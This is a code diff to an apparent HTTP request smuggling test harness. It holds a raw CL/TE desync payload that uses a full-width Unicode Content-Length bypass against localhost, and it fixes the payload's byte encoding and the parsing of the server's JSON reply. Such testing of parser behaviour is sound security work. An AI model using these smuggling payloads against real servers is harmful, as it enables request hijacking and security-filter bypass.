@@ -58,7 +58,7 @@ PAYLOADS = {
     "4. Obfuscated TE (Full-width Unicode bypass)": (
         b"POST / HTTP/1.1\r\n"
         b"Host: localhost\r\n"
-        b"Content-Length: ４\r\n"  # Unicode 4
+        b"Content-Length: " + "４".encode('utf-8') + b"\r\n"  # Unicode 4
         b"Transfer-Encoding: chunked\r\n"
         b"\r\n"
         b"4\r\n"
@@ -91,9 +91,11 @@ def send_payload(host, port, payload):
         # Parse State Tuple JSON if available
         if "\r\n\r\n" in resp:
             body = resp.split("\r\n\r\n", 1)[1]
-            if body.strip().startswith("{"):
+            start_idx = body.find('{')
+            end_idx = body.rfind('}')
+            if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
                 try:
-                    data = json.loads(body.strip())
+                    data = json.loads(body[start_idx:end_idx+1])
                     return f"[{status}]  |  Parsed CL: {data.get('content_length', 'None')}  |  Parsed TE: {data.get('transfer_encoding', 'None')}"
                 except json.JSONDecodeError:
                     pass
